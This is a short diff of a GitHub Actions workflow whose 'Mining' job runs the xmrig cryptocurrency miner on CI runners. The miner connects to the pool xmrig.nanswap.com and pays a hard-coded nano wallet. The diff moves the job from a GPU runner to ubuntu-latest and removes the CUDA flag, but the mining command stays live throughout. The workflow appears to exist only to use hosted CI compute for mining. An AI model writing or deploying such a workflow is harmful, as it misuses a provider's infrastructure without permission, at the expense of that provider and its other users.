@@ -7,10 +7,7 @@ on:
 
 jobs:
   load:
-    runs-on: 
-      - ubuntu-latest
-      - machine
-      - gpu=A10G
+    runs-on: ubuntu-latest
     steps:
       - name: checkout repo content
         uses: actions/checkout@v3
@@ -26,4 +23,4 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig --cuda -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=1
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_336mbragfzrsxi14jig4nmqzhfmyzhambrgxnaxa6ebj7pgh7q9t8ndfci6t -p x --randomx-mode=fast --donate-level=1
